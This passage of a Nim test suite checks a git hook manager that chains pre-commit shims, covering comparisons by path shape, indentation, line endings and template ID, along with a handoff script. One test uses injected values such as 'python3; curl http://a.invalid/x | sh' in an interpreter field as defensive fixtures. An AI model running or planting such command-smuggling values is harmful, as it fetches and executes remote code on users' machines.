    # DISCRIMINATION TEST for the SHAPE check on `INSTALL_PYTHON=`. The value is
    # reduced only when it is a bare path; anything carrying shell syntax is
    # compared as written. No other case builds a shim whose `INSTALL_PYTHON`
    # value is not a bare path, so reverting the line to a blanket elision left
    # the whole suite green — and a blanket elision would call these two files
    # one installer's output and discard one of them, when what they actually
    # differ in is the command each runs.
    let gitBin = findExe("git")
    if gitBin.len == 0:
      skip()
    else:
      let fx = setupWorkspace(gitBin, "ipshape", gitBackedRoot = true)
      defer: removeDir(fx.scratch)
      let hooksDir = hooksDirOf(fx.root / "lib-0")
      let pc = "/store/pre-commit-4.5.1/bin/pre-commit"
      let shimA = generatedPreCommitShim(
        "python3; curl http://a.invalid/x | sh", pc, "pre-push")
      let shimB = generatedPreCommitShim(
        "python3; curl http://b.invalid/x | sh", pc, "pre-push")

      # Premise, machine-checked: they differ, ONLY in the `INSTALL_PYTHON=`
      # line, and that marker matches exactly one line in each.
      check shimA != shimB
      check lineCountWith(shimA, "INSTALL_PYTHON=") == 1
      check lineCountWith(shimB, "INSTALL_PYTHON=") == 1
      check linesExcept(shimA, "INSTALL_PYTHON=") ==
        linesExcept(shimB, "INSTALL_PYTHON=")

      writeFile(hooksDir / "pre-push", shimA)
      inclFilePermissions(hooksDir / "pre-push", {fpUserExec})
      check ensure(fx).code == 0
      check readFile(hooksDir / "pre-push.repro-local") == shimA

      writeFile(hooksDir / "pre-push", shimB)
      inclFilePermissions(hooksDir / "pre-push", {fpUserExec})
      let refused = ensure(fx)
      checkpoint(refused.output)
      check refused.code != 0
      check (hooksDir / "pre-push.repro-local") in refused.output
      check readFile(hooksDir / "pre-push.repro-local") == shimA
      check readFile(hooksDir / "pre-push") == shimB

  test "test_ensure_refuses_shims_whose_exec_target_is_shell_syntax":
    # DISCRIMINATION TEST for the same shape check on the `exec` line. Reducing
    # an exec'd program to its FILE NAME is what makes a moved store path
    # repairable; doing it to text that is not a path would read two different
    # commands as one. Here the exec'd word is a shell EXPANSION, so it is
    # compared verbatim and the two files stay distinct.
    #
    # Untested until now: dropping `looksLikeBareToolPath` from the `exec`
    # branch reddened nothing — every other case execs a plain path, where the
    # reduction is the same with or without the guard.
    let gitBin = findExe("git")
    if gitBin.len == 0:
      skip()
    else:
      let fx = setupWorkspace(gitBin, "execshape", gitBackedRoot = true)
      defer: removeDir(fx.scratch)
      let hooksDir = hooksDirOf(fx.root / "lib-1")
      let py = "/store/python-3.13/bin/python3"
      # Same file name, different variable: a suffix match on the file name
      # would call these equal, which is exactly the defect being pinned.
      let shimA = generatedPreCommitShim(py, "$TOOLS_A/bin/pre-commit",
        "pre-push")
      let shimB = generatedPreCommitShim(py, "$TOOLS_B/bin/pre-commit",
        "pre-push")

      # Premise, machine-checked: they differ, ONLY in the `exec ` line.
      check shimA != shimB
      check lineCountWith(shimA, "exec ") == 1
      check lineCountWith(shimB, "exec ") == 1
      check linesExcept(shimA, "exec ") == linesExcept(shimB, "exec ")

      writeFile(hooksDir / "pre-push", shimA)
      inclFilePermissions(hooksDir / "pre-push", {fpUserExec})
      check ensure(fx).code == 0
      check readFile(hooksDir / "pre-push.repro-local") == shimA

      writeFile(hooksDir / "pre-push", shimB)
      inclFilePermissions(hooksDir / "pre-push", {fpUserExec})
      let refused = ensure(fx)
      checkpoint(refused.output)
      check refused.code != 0
      check (hooksDir / "pre-push.repro-local") in refused.output
      check readFile(hooksDir / "pre-push.repro-local") == shimA
      check readFile(hooksDir / "pre-push") == shimB

  test "test_ensure_refuses_shims_whose_reduced_lines_differ_in_indentation":
    # DISCRIMINATION TEST for the INDENTATION the two reduced lines keep. The
    # reduction replaces the path inside a line, not the line: a nested
    # `INSTALL_PYTHON=` or `exec` is in a different position in the script from
    # a top-level one, and reading them as the same line would let one file be
    # discarded for the other.
    #
    # Untested until now: dropping the indentation from BOTH reduced branches
    # reddened nothing, because every other case indents neither line.
    let gitBin = findExe("git")
    if gitBin.len == 0:
      skip()
    else:
      let fx = setupWorkspace(gitBin, "indent", gitBackedRoot = true)
      defer: removeDir(fx.scratch)
      let hooksDir = hooksDirOf(fx.root / "lib-2")
      let py = "/store/python-3.13/bin/python3"
      let pc = "/store/pre-commit-4.5.1/bin/pre-commit"
      let shimFlat = generatedPreCommitShim(py, pc, "pre-push")
      let shimNested = generatedPreCommitShim(py, pc, "pre-push", indent = "  ")

      # Premise, machine-checked: they differ, ONLY on the two reduced lines,
      # each marker matching exactly one line, and the difference is purely
      # leading whitespace — the words are identical.
      check shimFlat != shimNested
      check lineCountWith(shimFlat, "INSTALL_PYTHON=") == 1
      check lineCountWith(shimNested, "INSTALL_PYTHON=") == 1
      check lineCountWith(shimFlat, "exec ") == 1
      check lineCountWith(shimNested, "exec ") == 1
      check linesExceptAny(shimFlat, ["INSTALL_PYTHON=", "exec "]) ==
        linesExceptAny(shimNested, ["INSTALL_PYTHON=", "exec "])
      check shimFlat.splitLines().mapIt(it.strip()) ==
        shimNested.splitLines().mapIt(it.strip())

      writeFile(hooksDir / "pre-push", shimFlat)
      inclFilePermissions(hooksDir / "pre-push", {fpUserExec})
      check ensure(fx).code == 0
      check readFile(hooksDir / "pre-push.repro-local") == shimFlat

      writeFile(hooksDir / "pre-push", shimNested)
      inclFilePermissions(hooksDir / "pre-push", {fpUserExec})
      let refused = ensure(fx)
      checkpoint(refused.output)
      check refused.code != 0
      check (hooksDir / "pre-push.repro-local") in refused.output
      check readFile(hooksDir / "pre-push.repro-local") == shimFlat
      check readFile(hooksDir / "pre-push") == shimNested

  test "test_ensure_refuses_a_crlf_shim_against_its_lf_twin":
    # DISCRIMINATION TEST for the line-ending marker. The identity is built from
    # SPLIT lines, and splitting is exactly what hides a CRLF/LF difference — so
    # without the marker two files that are not the same bytes, and that a shell
    # does not read the same way, would compare equal and one would be
    # discarded.
    #
    # Untested until now: dropping the marker reddened nothing, because every
    # other case writes LF on both sides.
    let gitBin = findExe("git")
    if gitBin.len == 0:
      skip()
    else:
      let fx = setupWorkspace(gitBin, "crlf", gitBackedRoot = true)
      defer: removeDir(fx.scratch)
      let hooksDir = hooksDirOf(fx.root / "lib-0")
      let py = "/store/python-3.13/bin/python3"
      let pc = "/store/pre-commit-4.5.1/bin/pre-commit"
      let shimLf = generatedPreCommitShim(py, pc, "pre-push")
      let shimCrlf = generatedPreCommitShim(py, pc, "pre-push",
        lineEnding = "\r\n")

      # Premise, machine-checked: they differ, and ONLY in their line endings —
      # every line is the same text once the split has thrown the endings away,
      # which is precisely the difference the marker exists to keep.
      check shimLf != shimCrlf
      check "\r" notin shimLf
      check "\r" in shimCrlf
      check shimLf.splitLines() == shimCrlf.splitLines()

      writeFile(hooksDir / "pre-push", shimLf)
      inclFilePermissions(hooksDir / "pre-push", {fpUserExec})
      check ensure(fx).code == 0
      check readFile(hooksDir / "pre-push.repro-local") == shimLf

      writeFile(hooksDir / "pre-push", shimCrlf)
      inclFilePermissions(hooksDir / "pre-push", {fpUserExec})
      let refused = ensure(fx)
      checkpoint(refused.output)
      check refused.code != 0
      check (hooksDir / "pre-push.repro-local") in refused.output
      check readFile(hooksDir / "pre-push.repro-local") == shimLf
      check readFile(hooksDir / "pre-push") == shimCrlf

  test "test_ensure_refuses_shims_whose_template_id_value_differs":
    # DISCRIMINATION TEST for the `# ID:` VALUE, and the load-bearing one. The
    # handoff's header argues that `before` must not resume a stale copy because
    # a pre-commit template revision bump changes the `# ID:` line and `ensure`
    # "correctly refuses" — and
    # `test_a_crash_after_the_installer_converges_without_a_refusal` is written
    # on that premise. Nothing tested it: the pre-existing ID case removes the
    # line entirely (so the file is not recognised at all, a different branch),
    # and the crash case never reaches the two-foreign-files state, so
    # normalising the ID's VALUE away reddened nothing.
    #
    # Here the two shims differ in the ID and in NOTHING else, so the refusal is
    # attributable to the ID value alone.
    let gitBin = findExe("git")
    if gitBin.len == 0:
      skip()
    else:
      let fx = setupWorkspace(gitBin, "idvalue", gitBackedRoot = true)
      defer: removeDir(fx.scratch)
      let hooksDir = hooksDirOf(fx.root / "lib-1")
      let py = "/store/python-3.13/bin/python3"
      let pc = "/store/pre-commit-4.5.1/bin/pre-commit"
      let shimOld = generatedPreCommitShim(py, pc, "pre-push",
        id = "0000000000000000000000000000aaaa")
      let shimNew = generatedPreCommitShim(py, pc, "pre-push",
        id = "0000000000000000000000000000bbbb")

      # Premise, machine-checked: they differ, ONLY in the `# ID: ` line, and
      # both DO carry one — this is about the value, not about recognition.
      check shimOld != shimNew
      check lineCountWith(shimOld, "# ID: ") == 1
      check lineCountWith(shimNew, "# ID: ") == 1
      check linesExcept(shimOld, "# ID: ") == linesExcept(shimNew, "# ID: ")

      writeFile(hooksDir / "pre-push", shimOld)
      inclFilePermissions(hooksDir / "pre-push", {fpUserExec})
      check ensure(fx).code == 0
      check readFile(hooksDir / "pre-push.repro-local") == shimOld

      writeFile(hooksDir / "pre-push", shimNew)
      inclFilePermissions(hooksDir / "pre-push", {fpUserExec})
      let refused = ensure(fx)
      checkpoint(refused.output)
      check refused.code != 0
      check (hooksDir / "pre-push.repro-local") in refused.output
      check readFile(hooksDir / "pre-push.repro-local") == shimOld
      check readFile(hooksDir / "pre-push") == shimNew

  test "test_the_pre_commit_handoff_never_uncovers_the_dispatcher":
    # The other half of the same outage: the dev shell's shellHook runs
    # pre-commit's installer, and the installer is what creates the two-foreign
    # -files state in the first place. `scripts/pre_commit_hook_handoff.sh`
    # lends pre-commit back its own chained shim for the duration, so the
    # installer never meets a stale copy of its own output.
    #
    # The property that makes the handoff safe to run on EVERY shell entry —
    # including the overwhelmingly common one where the installer does nothing
    # — is that it never touches the canonical hook path. That is asserted at
    # each step, positively, by reading the file back.
    let gitBin = findExe("git")
    if gitBin.len == 0:
      skip()
    else:
      let fx = setupWorkspace(gitBin, "handoff", gitBackedRoot = true)
      defer: removeDir(fx.scratch)
      let hooksDir = hooksDirOf(fx.root / "lib-2")
      let ranFile = fx.scratch / "handoff-ran.txt"
      let aside = hooksDir / "pre-push.repro-local.handoff"
      let pcA = writeFakePreCommit(fx.scratch / "pre-commit-a" / "bin", "a",
        ranFile)
      let pcB = writeFakePreCommit(fx.scratch / "pre-commit-b" / "bin", "b",
        ranFile)
      let shimA = generatedPreCommitShim(fx.scratch / "python-a", pcA,
        "pre-push")
      let shimB = generatedPreCommitShim(fx.scratch / "python-b", pcB,
        "pre-push")

      writeFile(hooksDir / "pre-push", shimA)
      inclFilePermissions(hooksDir / "pre-push", {fpUserExec})
      check ensure(fx).code == 0
      check isDispatcher(hooksDir / "pre-push")
      check readFile(hooksDir / "pre-push.repro-local") == shimA

      # --- branch 1: the installer RUNS ---------------------------------
      let before1 = handoff(hooksDir, "before")
      checkpoint(before1.output)
      check before1.code == 0
      # The shim was lent back...
      check fileExists(aside)
      check readFile(aside) == shimA
      check not fileExists(hooksDir / "pre-push.repro-local")
      # ...and the gate is STILL the dispatcher. This is the whole safety
      # argument for running the handoff unconditionally.
      check isDispatcher(hooksDir / "pre-push")

      moveFile(hooksDir / "pre-push", hooksDir / "pre-push.legacy")
      writeFile(hooksDir / "pre-push", shimB)
      inclFilePermissions(hooksDir / "pre-push", {fpUserExec})
      check ensure(fx).code == 0
      let after1 = handoff(hooksDir, "after")
      checkpoint(after1.output)
      check after1.code == 0
      check isDispatcher(hooksDir / "pre-push")
      check readFile(hooksDir / "pre-push.repro-local") == shimB
      check not fileExists(aside)

      # --- branch 2: the installer does NOT run -------------------------
      # pre-commit's config was already current, which is every entry after
      # the first. Nothing chains anything, so the lent-back shim must come
      # home rather than be dropped.
      check handoff(hooksDir, "before").code == 0
      check fileExists(aside)
      check isDispatcher(hooksDir / "pre-push")
      check ensure(fx).code == 0
      check isDispatcher(hooksDir / "pre-push")
      check handoff(hooksDir, "after").code == 0
      check not fileExists(aside)
      check fileExists(hooksDir / "pre-push.repro-local")
      check readFile(hooksDir / "pre-push.repro-local") == shimB
      check isDispatcher(hooksDir / "pre-push")

      # --- branch 3: a shell entry dies between the two halves ----------
      check handoff(hooksDir, "before").code == 0
      check fileExists(aside)
      # The next entry starts with `before`, and it deliberately does NOT
      # resume: a copy is already out on loan and nothing is chained, so it
      # lends nothing and puts nothing back. The shim is not stranded — it stays
      # exactly where the crashed entry left it until `after` brings it home,
      # which is the recovery this script assigns to `after` alone (see the
      # "RECOVERY IS `after`'s JOB" note in scripts/pre_commit_hook_handoff.sh,
      # and `test_a_crash_after_the_installer_converges_without_a_refusal` for
      # the sequence a resume step would break).
      check handoff(hooksDir, "before").code == 0
      check fileExists(aside)
      check readFile(aside) == shimB
      check handoff(hooksDir, "after").code == 0
      check not fileExists(aside)
      check fileExists(hooksDir / "pre-push.repro-local")
      check readFile(hooksDir / "pre-push.repro-local") == shimB

      # --- branch 4: the installer ran and `ensure` did NOT finish ------
      # Putting the lent-back copy back here would rebuild the two-foreign-
      # files state the handoff exists to avoid, and it is superseded anyway:
      # the installer's newer output is sitting at the canonical path waiting
      # to be chained. So it is dropped, and the next `ensure` converges on
      # exactly one chained copy.
      check handoff(hooksDir, "before").code == 0
      check fileExists(aside)
      moveFile(hooksDir / "pre-push", hooksDir / "pre-push.legacy")
      writeFile(hooksDir / "pre-push", shimA)
      inclFilePermissions(hooksDir / "pre-push", {fpUserExec})
      check handoff(hooksDir, "after").code == 0
      check not fileExists(aside)
      check not fileExists(hooksDir / "pre-push.repro-local")
      check ensure(fx).code == 0
      check isDispatcher(hooksDir / "pre-push")
      check fileExists(hooksDir / "pre-push.repro-local")
      check readFile(hooksDir / "pre-push.repro-local") == shimA
      check not fileExists(hooksDir / "pre-push.legacy")

      # --- and the chain still runs -------------------------------------
      if fileExists(ranFile):
        removeFile(ranFile)
      let run = runShell(shellCommand(
        @["sh", "-c", quoteShell(hooksDir / "pre-push") & " origin " &
          quoteShell(fileUrl(fx.scratch / "origin-lib-2.git")) &
          " < /dev/null"],
        @[("REPROBUILD_REPRO", fx.reproBin)]), cwd = fx.root / "lib-2")
      checkpoint(run.output)
      check run.code == 0
      check fileExists(ranFile)
      check "a" in readFile(ranFile)
      check "b" notin readFile(ranFile)

  test "test_the_handoff_leaves_a_hand_written_chained_hook_alone":
    # The handoff lends a chained hook back to pre-commit's installer because
    # the installer is about to regenerate it. A hook somebody WROTE is not the
    # installer's to regenerate, and moving it out of the chain would take the
    # user's checks out of circulation for the length of the shell entry — and
    # for good, if that entry died before `after`.
    #
    # The guard that prevents it (`is_pre_commit_shim "$chained"`) held but was
    # untested: removing it reddened nothing, because every other handoff case
    # chains a shim that IS pre-commit's output.
    let gitBin = findExe("git")
    if gitBin.len == 0:
      skip()
    else:
      let fx = setupWorkspace(gitBin, "handwritten", gitBackedRoot = true)
      defer: removeDir(fx.scratch)
      let hooksDir = hooksDirOf(fx.root / "lib-0")
      let aside = hooksDir / "pre-push.repro-local.handoff"
      let ranFile = fx.scratch / "handwritten-ran.txt"
      # Deliberately NOT a pre-commit shim: no generator marker anywhere.
      let mine =
        "#!/usr/bin/env sh\n" &
        "# my own pre-push checks\n" &
        "printf '%s\\n' mine >> " & quoteShell(ranFile) & "\n" &
        "exit 0\n"
      check "File generated by pre-commit" notin mine

      writeFile(hooksDir / "pre-push", mine)
      inclFilePermissions(hooksDir / "pre-push", {fpUserExec})
      check ensure(fx).code == 0
      check isDispatcher(hooksDir / "pre-push")
      check readFile(hooksDir / "pre-push.repro-local") == mine

      # `before` must decline to lend it: no copy is set aside and the chain
      # is untouched.
      let before = handoff(hooksDir, "before")
      checkpoint(before.output)
      check before.code == 0
      check not fileExists(aside)
      check fileExists(hooksDir / "pre-push.repro-local")
      check readFile(hooksDir / "pre-push.repro-local") == mine
      check isDispatcher(hooksDir / "pre-push")

      # `after` is equally a no-op, so an entry that ran both halves leaves
      # the hand-written hook exactly where it was.
      check handoff(hooksDir, "after").code == 0
      check not fileExists(aside)
      check readFile(hooksDir / "pre-push.repro-local") == mine
      check isDispatcher(hooksDir / "pre-push")

      # And it still RUNS — the point of leaving it alone.
      if fileExists(ranFile): removeFile(ranFile)
      let run = runShell(shellCommand(
        @["sh", "-c", quoteShell(hooksDir / "pre-push") & " origin " &
          quoteShell(fileUrl(fx.scratch / "origin-lib-0.git")) &
          " < /dev/null"],
        @[("REPROBUILD_REPRO", fx.reproBin)]), cwd = fx.root / "lib-0")
      checkpoint(run.output)
      check run.code == 0
      check fileExists(ranFile)
      check "mine" in readFile(ranFile)

  test "test_a_crash_after_the_installer_converges_without_a_refusal":
    # The one sequence in which `before` restoring the set-aside copy would
    # have a live effect, and it is a HARMFUL one: the installer has already
    # written its newer shim to the canonical path, so putting the stale copy
    # back manufactures the two-foreign-files state the handoff exists to
    # prevent — and hands it to `ensure` to reconcile.
    #
    # `ensure` can only reconcile two shims it recognises as one installer's
    # output, and a pre-commit template revision bump changes the shim's
    # `# ID:` line, which is not normalised away (see
    # `test_ensure_refuses_two_shims_that_carry_no_pre_commit_template_id`
    # for why it must not be). So the resume step turns a converging sequence
    # into a refusal, for a state nothing needed to create. It was removed;
    # this case pins the behaviour that removal buys.
    let gitBin = findExe("git")
    if gitBin.len == 0:
      skip()
    else:
      let fx = setupWorkspace(gitBin, "crashresume", gitBackedRoot = true)
      defer: removeDir(fx.scratch)
      let target = fx.root / "lib-2"
      let hooksDir = hooksDirOf(target)
      let aside = hooksDir / "pre-push.repro-local.handoff"
      let ranFile = fx.scratch / "crashresume-ran.txt"
      let pcOld = writeFakePreCommit(fx.scratch / "pc-4.5.1" / "bin", "old",
        ranFile)
      let pcNew = writeFakePreCommit(fx.scratch / "pc-4.6.0" / "bin", "new",
        ranFile)
      # A template revision bump: the `# ID:` differs, so the two shims are
      # NOT interchangeable and `ensure` will not merge them.
      let shimOld = generatedPreCommitShim(fx.scratch / "py-old", pcOld,
        "pre-push", id = "0000000000000000000000000000aaaa")
      let shimNew = generatedPreCommitShim(fx.scratch / "py-new", pcNew,
        "pre-push", id = "0000000000000000000000000000bbbb")
      check shimOld != shimNew

      writeFile(hooksDir / "pre-push", shimOld)
      inclFilePermissions(hooksDir / "pre-push", {fpUserExec})
      check ensure(fx).code == 0
      check readFile(hooksDir / "pre-push.repro-local") == shimOld

      # Entry 1: `before` lends the shim back, the installer runs, and the
      # shell dies before `after` and before `repro hooks ensure`.
      check handoff(hooksDir, "before").code == 0
      check fileExists(aside)
      check readFile(aside) == shimOld
      moveFile(hooksDir / "pre-push", hooksDir / "pre-push.legacy")
      writeFile(hooksDir / "pre-push", shimNew)
      inclFilePermissions(hooksDir / "pre-push", {fpUserExec})

      # Entry 2 starts over. `before` must NOT put the stale copy back: the
      # canonical path already holds the installer's newer output, and nothing
      # is chained, so this is the ordinary one-foreign-file shape.
      let before2 = handoff(hooksDir, "before")
      checkpoint(before2.output)
      check before2.code == 0
      check not fileExists(hooksDir / "pre-push.repro-local")
      check readFile(hooksDir / "pre-push") == shimNew

      # So `ensure` converges instead of refusing.
      let converged = ensure(fx)
      checkpoint(converged.output)
      check converged.code == 0
      check isDispatcher(hooksDir / "pre-push")
      check isManagedBody(hooksDir / "pre-push.repro-managed")
      check readFile(hooksDir / "pre-push.repro-local") == shimNew
      check not fileExists(hooksDir / "pre-push.legacy")

      # And `after` collects the orphaned copy, so the sequence leaves exactly
      # one chained hook behind.
      check handoff(hooksDir, "after").code == 0
      check not fileExists(aside)
      check readFile(hooksDir / "pre-push.repro-local") == shimNew

      # The converged chain runs the NEW shim, not the stale one.
      if fileExists(ranFile): removeFile(ranFile)
      let run = runShell(shellCommand(
        @["sh", "-c", quoteShell(hooksDir / "pre-push") & " origin " &
          quoteShell(fileUrl(fx.scratch / "origin-lib-2.git")) &
          " < /dev/null"],
        @[("REPROBUILD_REPRO", fx.reproBin)]), cwd = target)
      checkpoint(run.output)
      check run.code == 0
      check fileExists(ranFile)
      check "new" in readFile(ranFile)
      check "old" notin readFile(ranFile)
